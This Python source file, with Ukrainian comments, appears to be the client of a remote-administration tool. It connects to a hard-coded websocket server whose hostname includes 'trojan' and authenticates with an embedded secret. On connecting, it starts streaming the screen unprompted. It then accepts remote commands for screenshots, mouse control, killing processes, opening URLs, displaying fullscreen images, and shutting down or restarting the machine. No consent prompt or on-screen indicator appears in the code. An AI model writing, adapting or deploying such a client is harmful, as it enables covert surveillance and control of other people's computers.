import asyncio
import base64
import io
import json
import logging
import os
import platform
import socket
import sys
import threading
import urllib.request
import uuid
import webbrowser
from typing import Any, Dict

import psutil
import websockets
from PIL import Image, ImageGrab, ImageDraw

try:
    import mss
    HAS_MSS = True
except ImportError:
    HAS_MSS = False

try:
    import pyautogui
    HAS_PYAUTOGUI = True
except Exception:
    pyautogui = None
    HAS_PYAUTOGUI = False

MOUSE_ACTIONS = {"mouse_move", "mouse_click", "mouse_down", "mouse_up", "mouse_scroll"}

if getattr(sys, 'frozen', False):
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

CONFIG_FILE = os.path.join(BASE_DIR, "client_config.json")

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("PC-Client")

if HAS_PYAUTOGUI:
    # Прибираємо штучні паузи та вимикаємо аварійний кут (миша має доходити у будь-яку точку)
    pyautogui.PAUSE = 0.001
    pyautogui.FAILSAFE = False


def init_platform():
    """Готує платформу перед запуском (DPI-сумісність зі скріншотами на Windows)."""
    if "windows" not in platform.system().lower():
        return
    try:
        import ctypes
        try:
            ctypes.windll.shcore.SetProcessDpiAwareness(2)  # PROCESS_PER_MONITOR_DPI_AWARE
        except Exception:
            ctypes.windll.user32.SetProcessDPIAware()
    except Exception:
        pass


DEFAULT_SERVER_URL = "wss://trojan-y9he.onrender.com/ws/client"
DEFAULT_SECRET = "super_secret_club_key_2026"

def get_hardware_id() -> str:
    """Генерує унікальний ідентифікатор заліза комп'ютера (HWID)."""
    try:
        import hashlib
        if platform.system().lower() == "windows":
            try:
                import winreg
                reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
                key = winreg.OpenKey(reg, r"SOFTWARE\Microsoft\Cryptography")
                guid, _ = winreg.QueryValueEx(key, "MachineGuid")
                if guid:
                    return hashlib.md5(guid.encode('utf-8')).hexdigest()[:12].upper()
            except Exception:
                pass
        
        node = str(uuid.getnode()) + socket.gethostname()
        return hashlib.md5(node.encode('utf-8')).hexdigest()[:12].upper()
    except Exception:
        return "UNKNOWN_HWID"

def load_or_create_config() -> dict:
    hwid = get_hardware_id()
    default_config = {
        "server_url": DEFAULT_SERVER_URL,
        "secret": DEFAULT_SECRET,
        "pc_name": f"PC_{hwid[:4]}",
        "hwid": hwid
    }

    if not os.path.exists(CONFIG_FILE):
        return default_config

    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            data["hwid"] = hwid
            if "server_url" not in data: data["server_url"] = DEFAULT_SERVER_URL
            if "secret" not in data: data["secret"] = DEFAULT_SECRET
            return data
    except Exception as e:
        logger.error(f"Помилка читання {CONFIG_FILE}: {e}")
        return default_config

def get_cursor_pos():
    """Отримує поточні координати курсору миші."""
    sys_name = platform.system().lower()
    if "windows" in sys_name:
        try:
            import ctypes
            class POINT(ctypes.Structure):
                _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
            pt = POINT()
            if ctypes.windll.user32.GetCursorPos(ctypes.byref(pt)):
                return pt.x, pt.y
        except Exception:
            pass
    elif "darwin" in sys_name:
        try:
            from AppKit import NSEvent, NSScreen
            loc = NSEvent.mouseLocation()
            h = NSScreen.mainScreen().frame().size.height
            return int(loc.x), int(h - loc.y)
        except Exception:
            pass
    try:
        import pyautogui
        p = pyautogui.position()
        return int(p[0]), int(p[1])
    except Exception:
        pass
    return None

def draw_cursor(img, cx: int, cy: int):
    """Малює контрастний вказівник миші на зображенні."""
    try:
        draw = ImageDraw.Draw(img)
        # Зовнішній чорний контур для чіткості на світлому фоні
        points_outer = [
            (cx - 1, cy - 1),
            (cx - 1, cy + 18),
            (cx + 4, cy + 13),
            (cx + 8, cy + 20),
            (cx + 12, cy + 18),
            (cx + 8, cy + 12),
            (cx + 14, cy + 12)
        ]
        # Внутрішня біла стрілка
        points_inner = [
            (cx, cy),
            (cx, cy + 15),
            (cx + 4, cy + 12),
            (cx + 7, cy + 18),
            (cx + 10, cy + 17),
            (cx + 7, cy + 11),
            (cx + 12, cy + 11)
        ]
        draw.polygon(points_outer, fill=(0, 0, 0))
        draw.polygon(points_inner, fill=(255, 255, 255))
    except Exception:
        pass

def get_screenshot_base64() -> str:
    try:
        img = ImageGrab.grab()
        mouse_pos = get_cursor_pos()
        if mouse_pos:
            draw_cursor(img, mouse_pos[0], mouse_pos[1])
        buffer = io.BytesIO()
        img.convert("RGB").save(buffer, format="JPEG", quality=75, optimize=True)
        return base64.b64encode(buffer.getvalue()).decode("utf-8")
    except Exception as e:
        logger.error(f"Помилка створення скріншоту: {e}")
        raise

def kill_process_by_name(target_name: str) -> int:
    target_lower = target_name.strip().lower()
    killed = 0
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            pname = proc.info['name']
            if pname and (pname.lower() == target_lower or pname.lower().startswith(target_lower.replace(".exe", ""))):
                proc.terminate()
                killed += 1
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    return killed

def get_process_list() -> list:
    procs = []
    for proc in psutil.process_iter(['pid', 'name', 'memory_info', 'cpu_percent']):
        try:
            mem_mb = (proc.info['memory_info'].rss / (1024 * 1024)) if proc.info['memory_info'] else 0
            procs.append({
                "pid": proc.info['pid'],
                "name": proc.info['name'] or "unknown",
                "memory": round(mem_mb, 1),
                "cpu": proc.info['cpu_percent'] or 0
            })
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    procs.sort(key=lambda x: x["memory"], reverse=True)
    return procs[:30]

def execute_shutdown():
    if "windows" in platform.system().lower():
        os.system("shutdown /s /t 0")
    else:
        os.system("shutdown -h now")

def execute_restart():
    if "windows" in platform.system().lower():
        os.system("shutdown /r /t 0")
    else:
        os.system("shutdown -r now")

def show_fullscreen_image(img_bytes: bytes, duration: float):
    def _worker():
        try:
            import tkinter as tk
            from PIL import ImageTk

            if not img_bytes or len(img_bytes) < 32:
                logger.error("Отримано порожні або занадто малі дані")
                return

            if img_bytes[:15].lower().startswith(b"<!doctype") or img_bytes[:6].lower().startswith(b"<html"):
                logger.error("Замість картинки отримано HTML")
                return

            pil_img = Image.open(io.BytesIO(img_bytes)).convert("RGB")
            root = tk.Tk()
            root.attributes('-fullscreen', True)
            root.attributes('-topmost', True)
            root.config(cursor="none")
            root.bind('<Escape>', lambda e: root.destroy())

            screen_w = root.winfo_screenwidth()
            screen_h = root.winfo_screenheight()

            pil_img.thumbnail((screen_w, screen_h), Image.Resampling.LANCZOS)
            bg_img = Image.new("RGB", (screen_w, screen_h), "black")
            bg_img.paste(pil_img, ((screen_w - pil_img.width) // 2, (screen_h - pil_img.height) // 2))

            tk_img = ImageTk.PhotoImage(bg_img)
            lbl = tk.Label(root, image=tk_img, bg="black")
            lbl.image = tk_img
            lbl.pack(fill="both", expand=True)

            root.after(int(duration * 1000), root.destroy)
            root.mainloop()
        except Exception as e:
            logger.error(f"Помилка показу картинки: {e}")

    threading.Thread(target=_worker, daemon=True).start()

is_streaming = False
stream_task = None
# Геометрія монітора, який зараз транслюється — потрібна для точного перерахунку координат миші
stream_monitor = None


def clamp_rel(value, fallback: float = 0.5) -> float:
    """Нормалізує відносну координату з браузера до діапазону 0.0–1.0."""
    try:
        v = float(value)
    except (TypeError, ValueError):
        return fallback
    return min(1.0, max(0.0, v))


def rel_to_screen(rel_x, rel_y):
    """Переводить відносні координати картинки (0.0–1.0) у пікселі монітора, що транслюється."""
    if stream_monitor:
        left = stream_monitor["left"]
        top = stream_monitor["top"]
        width = stream_monitor["width"]
        height = stream_monitor["height"]
    else:
        width, height = pyautogui.size()
        left = top = 0
    x = int(left + clamp_rel(rel_x) * (width - 1))
    y = int(top + clamp_rel(rel_y) * (height - 1))
    return x, y


def normalize_button(button) -> str:
    b = str(button or "left").strip().lower()
    return b if b in ("left", "right", "middle") else "left"


def perform_mouse_action(action: str, params: dict) -> dict:
    """
    Виконує дію миші на локальному ПК.
    Синхронно (без потоку), щоб порядок подій drag & drop не порушувався.
    """
    if not HAS_PYAUTOGUI:
        return {"status": "error", "message": "Бібліотека pyautogui не встановлена на цьому ПК"}

    button = normalize_button(params.get("button"))
    has_coords = params.get("x") is not None and params.get("y") is not None

    if action == "mouse_move":
        x, y = rel_to_screen(params.get("x", 0.5), params.get("y", 0.5))
        pyautogui.moveTo(x, y, _pause=False)

    elif action == "mouse_scroll":
        try:
            delta_y = float(params.get("delta_y") or 0)
        except (TypeError, ValueError):
            delta_y = 0.0
        # Одна сходинка колеса у браузері ≈ 100 одиниць deltaY (додатні — вниз)
        clicks = int(-delta_y / 100)
        if clicks == 0:
            clicks = 1 if delta_y < 0 else -1
        pyautogui.scroll(clicks, _pause=False)

    elif action in ("mouse_click", "mouse_down", "mouse_up"):
        if has_coords:
            x, y = rel_to_screen(params.get("x"), params.get("y"))
            pyautogui.moveTo(x, y, _pause=False)

        if action == "mouse_click":
            try:
                clicks = max(1, min(3, int(params.get("clicks") or 1)))
            except (TypeError, ValueError):
                clicks = 1
            if has_coords:
                pyautogui.click(x=x, y=y, button=button, clicks=clicks, _pause=False)
            else:
                pyautogui.click(button=button, clicks=clicks, _pause=False)
        elif action == "mouse_down":
            pyautogui.mouseDown(button=button, _pause=False)
        else:
            pyautogui.mouseUp(button=button, _pause=False)

    else:
        return {"status": "error", "message": f"Невідома дія миші: {action}"}

    return {"status": "ok"}


async def stream_loop(websocket, target_fps=8):
    global is_streaming, stream_monitor
    logger.info(f"Початок трансляції екрану ({target_fps} FPS)...")
    delay = max(0.04, 1.0 / target_fps)
    sct = mss.mss() if HAS_MSS else None
    try:
        while is_streaming:
            try:
                offset_x, offset_y = 0, 0
                if sct:
                    monitor = sct.monitors[1]
                    offset_x = monitor.get("left", 0)
                    offset_y = monitor.get("top", 0)
                    sct_img = sct.grab(monitor)
                    img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                else:
                    img = ImageGrab.grab()

                stream_monitor = {
                    "left": offset_x,
                    "top": offset_y,
                    "width": img.width,
                    "height": img.height
                }

                orig_w, orig_h = img.width, img.height
                ratio = 1.0
                if img.width > 960:
                    ratio = 960 / img.width
                    img = img.resize((960, int(img.height * ratio)), Image.Resampling.BILINEAR)

                # Відображення курсору миші
                mouse_pos = get_cursor_pos()
                if mouse_pos:
                    mx, my = mouse_pos
                    rel_x = mx - offset_x
                    rel_y = my - offset_y
                    if 0 <= rel_x < orig_w and 0 <= rel_y < orig_h:
                        cur_x = int(rel_x * ratio)
                        cur_y = int(rel_y * ratio)
                        draw_cursor(img, cur_x, cur_y)

                buf = io.BytesIO()
                img.convert("RGB").save(buf, format="JPEG", quality=45, optimize=False)
                b64_frame = base64.b64encode(buf.getvalue()).decode("utf-8")

                await websocket.send(json.dumps({"type": "stream_frame", "frame": b64_frame}))
                await asyncio.sleep(delay)
            except Exception as e:
                logger.warning(f"Помилка відправки кадру: {e}")
                await asyncio.sleep(0.15)
    finally:
        if sct:
            sct.close()
    logger.info("Трансляцію екрану зупинено.")

async def execute_action(action: str, params: dict, websocket=None) -> dict:
    global is_streaming, stream_task
    try:
        if action == "screenshot":
            return {"status": "ok", "image_base64": get_screenshot_base64()}

        elif action == "start_stream":
            fps = int(params.get("fps", 8))
            if is_streaming and stream_task and not stream_task.done():
                return {"status": "ok", "message": f"Стрім вже активний ({fps} FPS)"}
            if websocket:
                is_streaming = True
                stream_task = asyncio.create_task(stream_loop(websocket, target_fps=fps))
            return {"status": "ok", "message": f"Стрім запущено ({fps} FPS)"}

        elif action == "show_image":
            image_url = params.get("image_url")
            image_b64 = params.get("image_base64")
            duration = float(params.get("duration", 10))

            try:
                if image_b64:
                    img_data = base64.b64decode(image_b64)
                elif image_url:
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8'
                    }
                    req = urllib.request.Request(image_url, headers=headers)
                    with urllib.request.urlopen(req, timeout=15) as resp:
                        img_data = resp.read()
                else:
                    return {"status": "error", "message": "Не вказано картинку"}

                show_fullscreen_image(img_data, duration)
                return {"status": "ok", "message": f"Картинку виведено на весь екран на {duration} сек."}
            except Exception as ex:
                return {"status": "error", "message": f"Помилка завантаження картинки: {ex}"}

        elif action == "stop_stream":
            is_streaming = False
            return {"status": "ok", "message": "Стрім зупинено"}

        elif action == "open_url":
            url = params.get("url")
            if not url: return {"status": "error", "message": "Не вказано URL"}
            webbrowser.open(url)
            return {"status": "ok", "message": f"URL {url} відкрито"}

        elif action == "kill_process":
            proc_name = params.get("name")
            if not proc_name: return {"status": "error", "message": "Не вказано назву процесу"}
            killed = kill_process_by_name(proc_name)
            return {"status": "ok", "killed_count": killed} if killed > 0 else {"status": "error", "message": "Процес не знайдено"}

        elif action == "list_processes":
            return {"status": "ok", "processes": get_process_list()}

        elif action in MOUSE_ACTIONS:
            return perform_mouse_action(action, params)

        elif action == "restart":
            asyncio.get_event_loop().call_later(1.0, execute_restart)
            return {"status": "ok", "message": "ПК перезавантажується..."}

        elif action == "shutdown":
            asyncio.get_event_loop().call_later(1.0, execute_shutdown)
            return {"status": "ok", "message": "ПК вимикається..."}

        else:
            return {"status": "error", "message": f"Невідома дія: {action}"}

    except Exception as e:
        logger.error(f"Помилка виконання {action}: {e}")
        return {"status": "error", "message": str(e)}

async def heartbeat_sender(websocket):
    while True:
        try:
            stats = {
                "cpu": psutil.cpu_percent(),
                "ram": psutil.virtual_memory().percent,
                "os": platform.system()
            }
            await websocket.send(json.dumps({"type": "heartbeat", "stats": stats}))
            await asyncio.sleep(5)
        except Exception:
            break

async def run_client():
    global is_streaming, stream_task
    cfg = load_or_create_config()
    server_base = cfg["server_url"].rstrip("/")
    secret = cfg["secret"]
    pc_name = cfg["pc_name"]
    hwid = cfg.get("hwid", get_hardware_id())

    uri = f"{server_base}/{pc_name}?secret={secret}&hwid={hwid}"
    logger.info(f"Підключення до сервера (HWID={hwid})...")

    while True:
        try:
            async with websockets.connect(
                uri,
                ping_interval=15,
                ping_timeout=20,
                close_timeout=10,
                max_size=25 * 1024 * 1024
            ) as websocket:
                logger.info("✅ Успішно підключено до сервера!")
                heartbeat_task = asyncio.create_task(heartbeat_sender(websocket))
                if not is_streaming:
                    is_streaming = True
                    stream_task = asyncio.create_task(stream_loop(websocket, target_fps=8))

                try:
                    async for message_str in websocket:
                        try:
                            msg = json.loads(message_str)
                            if msg.get("type") == "assigned_name":
                                logger.info(f"🌟 Цьому ПК офіційно призначено ім'я: {msg.get('pc_name')}")
                                continue

                            req_id = msg.get("request_id")
                            action = msg.get("action")
                            params = msg.get("params", {})
                            if action != "mouse_move":
                                logger.info(f"Отримано команду: {action}")
                            result = await execute_action(action, params, websocket=websocket)

                            if req_id:
                                await websocket.send(json.dumps({
                                    "type": "response",
                                    "request_id": req_id,
                                    **result
                                }))
                        except json.JSONDecodeError:
                            logger.warning(f"Невірний формат повідомлення: {message_str}")
                finally:
                    heartbeat_task.cancel()
                    if is_streaming:
                        is_streaming = False
                        if stream_task:
                            stream_task.cancel()

        except Exception as e:
            logger.warning(f"З'єднання втрачено ({type(e).__name__}: {e}). Перепідключення через 5 секунд...")
            await asyncio.sleep(5)

if __name__ == "__main__":
    init_platform()
    if not HAS_PYAUTOGUI:
        logger.warning("pyautogui не знайдено — керування мишею буде недоступне (pip install pyautogui)")
    try:
        asyncio.run(run_client())
    except KeyboardInterrupt:
        logger.info("Клієнт зупинено.")
